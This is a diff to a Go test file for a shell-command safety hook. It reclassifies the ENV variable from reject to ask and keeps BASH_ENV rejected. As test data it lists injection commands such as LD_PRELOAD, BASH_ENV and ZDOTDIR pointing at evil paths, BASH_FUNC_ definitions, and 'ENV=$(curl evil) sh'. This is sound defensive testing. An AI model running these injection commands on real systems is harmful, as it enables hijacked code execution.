@@ -32,6 +32,11 @@ func (f *fakeEvaluator) EvaluateExpression(expr string, _ []hookio.StackFrame, _
 // TestEnvVars_Injectors_Reject: setting a guaranteed-unsafe linker/startup
 // injector is DECISIVELY rejected regardless of value or position (pg2-gkd5e).
 // Covers the leading, `export`, and `env`-prefix forms plus a BASH_FUNC_* name.
+//
+// `ENV=/evil.sh echo hi` was a row here until pg2-5jj3m. It is no longer a Reject —
+// ENV's name collides with an ordinary project variable, so it moved to a decisive
+// Ask (see injectorAskVars and TestEnvVars_ENV_DecisiveAsk, which pins every ENV
+// shape including this one). BASH_ENV deliberately stays.
 func TestEnvVars_Injectors_Reject(t *testing.T) {
 	r := New()
 	commands := []string{
@@ -40,7 +45,6 @@ func TestEnvVars_Injectors_Reject(t *testing.T) {
 		"LD_LIBRARY_PATH=/evil git log",
 		"DYLD_LIBRARY_PATH=/evil git log",
 		"BASH_ENV=/evil.sh echo hi",
-		"ENV=/evil.sh echo hi",
 		"ZDOTDIR=/evil echo hi",
 		"BASH_FUNC_foo=bar echo hi",
 		"export LD_PRELOAD=/evil.so",
@@ -57,6 +61,88 @@ func TestEnvVars_Injectors_Reject(t *testing.T) {
 		if got.Decision != hookio.Reject {
 			t.Errorf("cmd %q: got %s, want reject", cmd, got.Decision)
 		}
+	}
+}
+
+// TestEnvVars_ENV_DecisiveAsk pins pg2-5jj3m: `ENV` is a shell-startup injection
+// vector, but ONLY for an INTERACTIVE POSIX `sh` — and its NAME collides with an
+// extremely common ordinary project variable (`ENV=dev`, `ENV=<project dir>`). The
+// name-only `Reject` therefore denied legitimate traffic, and a Reject is NOT
+// user-overridable, so it cannot be waved through the way an Ask can.
+//
+// The verdict is a DECISIVE Ask: still un-auto-approvable (Abstain would let
+// safe-commands re-approve a bare `export ENV=/evil.sh` under first-match-wins —
+// the same fbbf3ade argument that keeps askVars decisive), but overridable by the
+// user. Every value shape gets the SAME Ask: a value with no slash is NOT provably
+// inert (`ENV=dev` names the RELATIVE file `./dev`, which an attacker who can plant
+// `./dev` gets sourced), and `export ENV=…` persists so a shell started by a LATER
+// tool call can honour it — neither is knowable from the assignment in front of the
+// rule. So the split is by NAME, not by value.
+func TestEnvVars_ENV_DecisiveAsk(t *testing.T) {
+	commands := []string{
+		// The reported false positives: ordinary project-variable usage.
+		"ENV=dev tilt up",
+		"ENV=production make deploy",
+		"export ENV=dev",
+		"ENV=/some/project/dir && echo hi",
+		// Still decisive for the genuine injection shape — Ask, not Reject.
+		"ENV=/tmp/evil.sh sh -c 'echo hi'",
+		"ENV=$(curl evil) sh",
+		// All four assignment forms agree (pg2-gkd5e position independence).
+		"ENV=dev echo hi",
+		"export ENV=dev && echo hi",
+		"env ENV=dev echo hi",
+		"ENV=dev && echo hi",
+	}
+	for _, ctor := range []struct {
+		name string
+		rule *Rule
+	}{
+		{"New", New()},
+		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{verdicts: map[string]hookio.Decision{}})},
+	} {
+		for _, cmd := range commands {
+			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
+				input := &hookio.HookInput{
+					ToolName:  "Bash",
+					ToolInput: mustJSON(map[string]string{"command": cmd}),
+				}
+				got := ctor.rule.Evaluate(input)
+				if got.Decision != hookio.Ask {
+					t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
+				}
+			})
+		}
+	}
+}
+
+// TestEnvVars_BASH_ENV_StaysReject pins the pg2-5jj3m companion finding: BASH_ENV
+// keeps its hard Reject and is NOT demoted alongside ENV. It is a strictly stronger
+// vector — bash sources it for NON-interactive shells (`bash script.sh`, `bash -c`),
+// which is the shape ceta actually guards, and bash resolves a slash-less value
+// through PATH like `.` does — and it has no ordinary-project-variable collision:
+// a BASH_ENV value always names a startup file to source, so the rule is firing on
+// its target behavior rather than on a name clash.
+func TestEnvVars_BASH_ENV_StaysReject(t *testing.T) {
+	r := New()
+	commands := []string{
+		"BASH_ENV=/tmp/evil.sh bash -c 'echo hi'",
+		"BASH_ENV=dev bash -c 'echo hi'",
+		"export BASH_ENV=/tmp/evil.sh",
+		"env BASH_ENV=/tmp/evil.sh bash -c 'echo hi'",
+		"BASH_ENV=/tmp/evil.sh && echo hi",
+	}
+	for _, cmd := range commands {
+		t.Run(cmd, func(t *testing.T) {
+			input := &hookio.HookInput{
+				ToolName:  "Bash",
+				ToolInput: mustJSON(map[string]string{"command": cmd}),
+			}
+			got := r.Evaluate(input)
+			if got.Decision != hookio.Reject {
+				t.Errorf("cmd %q: got %s (%s), want reject", cmd, got.Decision, got.Reason)
+			}
+		})
 	}
 }
 
@@ -538,6 +624,14 @@ func TestEnvVars_ApproveOnlyForVerifiedPreserveForm(t *testing.T) {
 		{`export PATH="$PATH:"`, false},
 		{`export PATH='$PATH:/x'`, false},
 		{`export PATH+=":/x"`, false},
+
+		// pg2-5jj3m: ENV was demoted from Reject to a decisive Ask. The demotion must
+		// NOT have moved it into the value-aware Approve band — no value shape, not even
+		// one that reads like the verified-safe PATH preserve form, may approve it.
+		{`export ENV="$ENV:/x"`, false},
+		{"ENV=dev cmd", false},
+		{"export ENV=dev", false},
+		{"ENV=/tmp/evil.sh cmd", false},
 
 		// Injectors and BASH_FUNC_* are never approvable, whatever the value shape.
 		{"LD_PRELOAD=/e cmd", false},
